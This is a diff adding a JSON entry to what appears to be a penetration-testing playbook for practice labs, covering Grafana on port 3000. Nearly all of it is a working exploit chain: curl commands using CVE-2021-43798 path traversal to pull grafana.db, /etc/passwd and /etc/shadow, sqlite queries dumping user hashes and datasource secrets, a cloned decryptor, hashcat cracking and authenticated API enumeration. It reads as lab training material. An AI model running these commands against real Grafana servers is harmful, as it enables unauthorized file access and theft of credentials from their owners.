@@ -1,0 +1,26 @@
+{
+  "id": "grafana",
+  "phase": "WEB",
+  "title": "Grafana (3000)",
+  "body": "Grafana shows up constantly on practice machines. CVE-2021-43798 is unauthenticated path traversal — grab the database and extract admin credentials from it.",
+  "cmd": "# ── STEP 1: VERSION CHECK ─────────────────────────────\ncurl -s http://$ip:3000/api/health\n# {\"version\":\"8.3.0\",...}  ← leaks exact version\n# Also visible on login page source\n# CVE-2021-43798 affects Grafana <= 8.3.0\n\n# ── STEP 2: TRY DEFAULT CREDS FIRST ──────────────────\n# admin:admin  admin:password  admin:grafana\n# (fastest path if not patched)\n\n# ── STEP 3: CVE-2021-43798 — PATH TRAVERSAL ──────────\n# Unauthenticated — grabs SQLite database\ncurl --path-as-is -s   \"http://$ip:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db\"   -o grafana.db\n\n# If alertlist fails try other installed plugins:\nfor plugin in dashboard graph table text stat gauge barchart timeseries; do\n  curl -s --path-as-is \"http://$ip:3000/public/plugins/$plugin/../../../../../../../../../var/lib/grafana/grafana.db\" -o grafana.db\n  file grafana.db | grep -q SQLite && echo \"SUCCESS: $plugin\" && break\ndone\n\n# Read any file (not just the DB):\ncurl --path-as-is \"http://$ip:3000/public/plugins/alertlist/../../../../../../../../../etc/passwd\"\ncurl --path-as-is \"http://$ip:3000/public/plugins/alertlist/../../../../../../../../../etc/shadow\"\n\n# ── STEP 4: EXTRACT FROM DATABASE ────────────────────\nsqlite3 grafana.db \"SELECT login,password,salt FROM user;\"\nsqlite3 grafana.db \".tables\"   # see all tables\nsqlite3 grafana.db \"SELECT * FROM data_source;\"   # datasource creds!\n\n# ── STEP 5: OPEN DB AND LOOK THROUGH EVERYTHING ──────\n# Don't just run one query — browse the whole database\nsqlite3 grafana.db \".tables\"\nsqlite3 grafana.db \"SELECT * FROM data_source;\"\n# secure_json_data column contains AES-encrypted passwords\n\n# strings the raw file too — blobs sometimes visible\nstrings grafana.db | grep -i \"pass|secret|key|token\"\n\n# ── STEP 5A: DECRYPT DATASOURCE PASSWORD (DO THIS FIRST) ─\n# Datasource passwords = AES encrypted, NOT bcrypt\n# Admins often reuse their system account password here\n# Prometheus, MySQL, PostgreSQL datasources all store creds this way\n# Decrypts INSTANTLY — do this before attempting to crack anything\n\ngit clone https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798.git\ncd Grafana-Decryptor-for-CVE-2021-43798\npython3 decrypt.py\n# Paste the encrypted blob from secure_json_data → get plaintext\n# Lab result: anBneWFN... → SuperSecureP@ssw0rd (sysadmin SSH cred)\n\n# ── STEP 5B: CRACK BCRYPT HASHES (last resort, slow) ─\n# User table passwords = bcrypt — often NOT valid system accounts\n# Try cracking but don't count on it\nsqlite3 grafana.db \"SELECT login,password FROM user;\"\nhashcat -m 3200 grafana_hashes.txt /usr/share/wordlists/rockyou.txt\n# github.com/iamaldi/grafana2hashcat — converts format for hashcat\n\n# ── STEP 6: POST-LOGIN ENUM ───────────────────────────\n# Configuration > Data Sources — check all stored creds\ncurl -u admin:password http://$ip:3000/api/datasources\ncurl -u admin:password http://$ip:3000/api/users\ncurl -u admin:password http://$ip:3000/api/org/users",
+  "warn": "The user table bcrypt hash is often a rabbit hole — slow to crack and may not even be a valid system account. Open the DB and look through EVERYTHING manually. The data_source table contains backend service credentials (Prometheus, MySQL, etc) encrypted with AES not bcrypt — they decrypt instantly. Admins frequently reuse their system account password as the datasource credential. Lab validated: Fanatastic (PG Practice) — user hash was useless, datasource password was the system SSH cred.",
+  "choices": [
+    {
+      "label": "Got datasource plaintext password",
+      "next": "creds_found"
+    },
+    {
+      "label": "Cracked bcrypt hash",
+      "next": "creds_found"
+    },
+    {
+      "label": "Default creds worked",
+      "next": "creds_found"
+    },
+    {
+      "label": "Also have Prometheus (9090) — check targets",
+      "next": "other_services"
+    }
+  ]
+}
